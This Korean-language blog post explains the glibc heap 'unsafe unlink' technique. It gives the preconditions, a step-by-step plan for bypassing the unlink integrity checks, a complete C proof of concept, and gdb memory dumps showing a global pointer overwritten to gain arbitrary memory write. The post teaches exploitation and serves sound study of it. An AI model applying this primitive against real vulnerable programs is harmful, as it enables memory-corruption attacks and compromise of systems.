---
title: Unsafe Unlink
author: Beomsu Lee
category: [Exploitation, Heap]
tags: [exploitation, heap, unlink]
math: true
mermaid: true
---


## Conditions

- 공격자에 의해 생성된 heap 영역이 전역 변수에서 관리되어야 함
- 공격자에 의해 크기가 0x80 이상의 heap 영역을 할당할 수 있어야 함
- 공격자에 의해 1번째 heap 영역에 fake Chunk을 저장할 수 있어야 함
- 공격자에 의해 2번째 heap 영역에 header를 덮어쓸 수 있어야 하며 PREV_INUSE가 제거 되어야 함
- 공격자에 의해 2번째 heap 영역을 해제할 수 있어야 함

## Exploit plan

1. 2개의 heap 영역 할당
    - 할당받은 첫 번째 heap 영역의 주소는 전역변수에 저장
2. 1번째 heap 영역에 fake chunk(Free) 구조를 저장(fd, bk)
    - prev_size : 0x0
    - size : 0x0
    - fd : target address(전역변수 주소) - 0x18
    - bk : target address(전역변수 주소) - 0x10
3. 2번쨰 Heap 영역의 header 값을 변조
    - “prev_size” 설정(second chunk - prev_size = fake chunk)
    - “PREV_INUSE” flag 해제
4. 2번째 heap 영역 해제
5. 전역변수 영역에 fake chunk의 fd 값이 저장됨
6. 전역변수[3] 영역에 공격자가 접근하려는 주소 값 저장
    - 전역변수를 통해 원하는 영역에 값을 쓸 수 있음

## Mitigation

### P->bk != P || BK->fd != P

- P->fd->bk, P->bk->fd의 값이 P의 값과 다른지 확인
- fd에 “fake chunk가 저장된 변수의 주소 - 0x18” 값을 저장
- bk에 “fake chunk가 저장된 변수의 주소 - 0x10” 값을 저장

### chunksize(P) != prev_size (next_chunk(P))

- unlink() 함수에서 P->size와 next chunk->prev_size의 값이 다른지 확인
- prev_size(0x0), size(0x0)으로 변조하여 우회
- size 영역의 값이 0x0이기 때문에 next chunk(fake chunk + 0x0)의 주소는 결국 fake chunk의 주소가 됨

```c
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            \
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr (check_action, "corrupted size vs. prev_size", P, AV);  \
    FD = P->fd;                                    \
    BK = P->bk;                                    \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))           \
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
    else {                                    \
        FD->bk = BK;                               \
        BK->fd = FD;                               \
        if (!in_smallbin_range (chunksize_nomask (P))                 \
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {             \
        if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)          \
        || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
          malloc_printerr (check_action,                      \
                   "corrupted double-linked list (not small)",    \
                   P, AV);                        \
            if (FD->fd_nextsize == NULL) {                     \
                if (P->fd_nextsize == P)                   \
                  FD->fd_nextsize = FD->bk_nextsize = FD;           \
                else {                                \
                    FD->fd_nextsize = P->fd_nextsize;               \
                    FD->bk_nextsize = P->bk_nextsize;               \
                    P->fd_nextsize->bk_nextsize = FD;               \
                    P->bk_nextsize->fd_nextsize = FD;               \
                  }                               \
              } else {                                \
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;            \
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;            \
              }                                   \
          }                                   \
      }                                       \
}
```

## Proof of concept

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

uint64_t *chunk0_ptr;

int main()
{
    fprintf(stderr, "Welcome to unsafe unlink 2.0!\n");
    fprintf(stderr, "Tested in Ubuntu 14.04/16.04 64bit.\n");
    fprintf(stderr, "This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n");
    fprintf(stderr, "The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n");

    int malloc_size = 0x80; //we want to be big enough not to use fastbins
    int header_size = 2;

    fprintf(stderr, "The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n");

    chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
    uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
    fprintf(stderr, "The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
    fprintf(stderr, "The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);

    fprintf(stderr, "We create a fake chunk inside chunk0.\n");
    fprintf(stderr, "We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");
    chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
    fprintf(stderr, "We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\n");
    fprintf(stderr, "With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n");
    chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
    fprintf(stderr, "Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
    fprintf(stderr, "Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);

    fprintf(stderr, "We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
    uint64_t *chunk1_hdr = chunk1_ptr - header_size;
    fprintf(stderr, "We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
    fprintf(stderr, "It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");
    chunk1_hdr[0] = malloc_size;
    fprintf(stderr, "If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
    fprintf(stderr, "We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n");
    chunk1_hdr[1] &= ~1;

    fprintf(stderr, "Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
    fprintf(stderr, "You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n");
    free(chunk1_ptr);

    fprintf(stderr, "At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
    char victim_string[8];
    strcpy(victim_string,"Hello!~");
    chunk0_ptr[3] = (uint64_t) victim_string;

    fprintf(stderr, "chunk0_ptr is now pointing where we want,we use it to overwrite our victim string.\n");
    fprintf(stderr, "Original value: %s\n",victim_string);
    scanf("%125s",chunk0_ptr);
    fprintf(stderr, "New Value: %s\n",victim_string);
}
```

할당된 chunk이다.

```
gdb-peda$ x/24gx 0x603000
0x603000:   0x0000000000000000  0x0000000000000091 <- chunk 0
0x603010:   0x0000000000000000  0x0000000000000000
0x603020:   0x0000000000000000  0x0000000000000000
0x603030:   0x0000000000000000  0x0000000000000000
0x603040:   0x0000000000000000  0x0000000000000000
0x603050:   0x0000000000000000  0x0000000000000000
0x603060:   0x0000000000000000  0x0000000000000000
0x603070:   0x0000000000000000  0x0000000000000000
0x603080:   0x0000000000000000  0x0000000000000000
0x603090:   0x0000000000000000  0x0000000000000091 <- chunk 1
0x6030a0:   0x0000000000000000  0x0000000000000000
0x6030b0:   0x0000000000000000  0x0000000000000000
0x6030c0:   0x0000000000000000  0x0000000000000000
0x6030d0:   0x0000000000000000  0x0000000000000000
0x6030e0:   0x0000000000000000  0x0000000000000000
0x6030f0:   0x0000000000000000  0x0000000000000000
0x603100:   0x0000000000000000  0x0000000000000000
0x603110:   0x0000000000000000  0x0000000000000000
```

chunk0 영역에 fake chunk를 만들어준다.

```
We create a fake chunk inside chunk0.
We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.
We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.
With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False
Fake chunk fd: 0x602058
Fake chunk bk: 0x602060
```

```
gdb-peda$ x/24gx 0x603000
0x603000:   0x0000000000000000  0x0000000000000091 <- chunk0 
0x603010:   0x0000000000000000  0x0000000000000000 <- Fake Chunk
0x603020:   0x0000000000602058  0x0000000000000000
```

```
We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.
We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.
It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly
If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: 0x80
We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.
You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344
```

chunk1의 prev_size를 0x90 - 0x10로 변조하면 Fake Chunk를 가리키게 된다. previous_in_use flag를 변조하여 chunk0을 freed 영역으로 만들었다.

```
gdb-peda$ x/24gx 0x603000
0x603000:   0x0000000000000000 <- chunk0     0x0000000000000091
0x603010:   0x0000000000000000 <- Fake Chunk 0x0000000000000000 
0x603020:   0x0000000000602058               0x0000000000602060
0x603030:   0x0000000000000000               0x0000000000000000
0x603040:   0x0000000000000000               0x0000000000000000
0x603050:   0x0000000000000000               0x0000000000000000
0x603060:   0x0000000000000000               0x0000000000000000
0x603070:   0x0000000000000000               0x0000000000000000
0x603080:   0x0000000000000000               0x0000000000000000
0x603090:   0x0000000000000080 <- prev_size  0x0000000000000090 <- previous_in_use
gdb-peda$ parseheap
addr                prev                size                 status              fd                bk                
0x603000            0x0                 0x90                 Freed                0x0               0x0
0x603090            0x80                0x90                 Used                None              None
```

다음 코드로 인해 FD->bk와 BK->fd는 둘 다 chunk0_ptr을 가리키게 되어 mitigation bypass가 가능하다. BK(0x602060)->fd(0x602070) = FD 에 의해 0x602058로 overwrite 된다.

```
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))
malloc_printerr (check_action, "corrupted double-linked list", P, AV);
else {
    FD->bk = BK; 
    BK->fd = FD;  <- 
    ...
}
```

free 후 chunk0_ptr이 0x602058로 overwrite 됐다.

```
gdb-peda$ parseheap
addr                prev                size                 status              fd                bk                
0x603000            0x0                 0x90                 Freed                0x0           0x20ff1
Corrupt ?!
gdb-peda$ p chunk0_ptr
$1 = 0x602058
```

chunk0_ptr(0x602070) 변수에 저장된 주소는 0x602058이다.즉, 0x602058 + 0x18 영역에 값을 쓸 수 있다면, chunk0_ptr에 저장된 주소 값을 변조할 수 있게 된다. 이로 인해 stack, .got, .plt 영역에 접근하여 값을 변조할 수 있다.

```
gdb-peda$ x/24gx 0x0000000000602058
0x602058:   0x0000000000000000  0x00007ffff7dd2540
0x602068:   0x0000000000000000  0x00007fffffffe4f0 <- victim_string
gdb-peda$ x/gx &chunk0_ptr
0x602070 <chunk0_ptr>:  0x00007fffffffe4f0
```

전역변수 포인터(chunk0_ptr)에 입력 scanf로 입력받으면 해당 주소 값이 변조된다.

```
At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.
chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.
Original value: Hello!~
AAAAAAAA
New Value: AAAAAAAA
```

## References
- [Unsafe unlink](https://www.lazenca.net/display/TEC/unsafe+unlink)
- [https://github.com/shellphish/how2heap](https://github.com/shellphish/how2heap)